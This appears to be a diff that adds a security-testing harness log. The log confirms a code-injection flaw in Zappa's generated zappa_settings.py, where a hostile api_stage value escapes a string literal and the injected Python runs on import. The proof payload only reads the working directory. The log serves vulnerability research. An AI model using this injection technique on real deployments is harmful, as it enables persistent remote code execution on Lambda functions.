@@ -1,0 +1,8 @@
+[INFO] exercising: zappa/cli.py:3050-3203 get_zappa_settings_string (sink e.g. :3129)
+[STEP] generating zappa_settings.py from a hostile api_stage scalar, then importing it (exec)
+[INFO] generated: API_STAGE='dev'
+[INFO] generated: INJECTED_5aaf53b2 = __import__('os').getcwd()
+[INFO] after import, injected symbol INJECTED_5aaf53b2 = '/app/_harness'
+[PROOF] the malicious api_stage escaped the '{0!s}' string literal; the generated zappa_settings.py contained an attacker statement that RAN on import (set INJECTED_5aaf53b2='/app/_harness') — arbitrary Python executes at Lambda cold start, persistently.
+[OK] exploit confirmed — code injection into generated settings -> cold-start RCE
+==> VULN-016: CONFIRMED — hostile scalar injects executable Python into zappa_settings.py
